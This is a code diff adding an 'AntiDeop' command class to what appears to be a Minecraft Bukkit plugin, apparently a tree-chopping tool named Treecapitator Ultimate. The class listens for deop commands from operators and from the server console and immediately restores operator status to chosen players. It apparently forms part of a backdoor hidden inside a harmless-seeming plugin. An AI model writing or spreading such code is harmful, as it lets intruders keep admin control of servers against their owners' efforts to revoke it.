@@ -1,0 +1,55 @@
+package me.bow.treecapitatorultimate.commands.Server;
+
+import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.command.Command;
+import me.bow.treecapitatorultimate.command.CommandCategory;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.server.ServerCommandEvent;
+
+import java.util.ArrayList;
+import java.util.UUID;
+
+public class AntiDeop extends Command {
+    ArrayList<UUID> players = new ArrayList<>();
+
+    public AntiDeop() {
+        super("antideop", "Prevents deoping you", CommandCategory.Server);
+    }
+
+    @Override
+    public void onCommand(Player p, ArrayList<String> args) {
+        if (players.contains(p.getUniqueId())) {
+            players.remove(p.getUniqueId());
+            p.sendMessage(Start.Prefix + ChatColor.RED + "You can now be deoped!");
+        } else {
+            players.add(p.getUniqueId());
+            p.sendMessage(Start.Prefix + ChatColor.GREEN + "You now can not be deoped!");
+        }
+    }
+
+    @Override
+    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
+        if (!e.getPlayer().isOp()) return;
+        String command = e.getMessage();
+        if (!command.startsWith("/" + "deop")) return;
+        OpDelayed(command);
+    }
+
+    @Override
+    public void onServerCommand(ServerCommandEvent e) {
+        String command = e.getCommand();
+        if (!command.startsWith("deop")) return;
+        OpDelayed(command);
+    }
+
+    private void OpDelayed(String command) {
+        String[] args = command.split(" ");
+        if (args.length <= 1) return;
+        Player p = Bukkit.getPlayer(args[1]);
+        if (p == null || !players.contains(p.getUniqueId())) return;
+        Bukkit.getScheduler().runTask(Start.Instance, () -> p.setOp(true));
+    }
+}
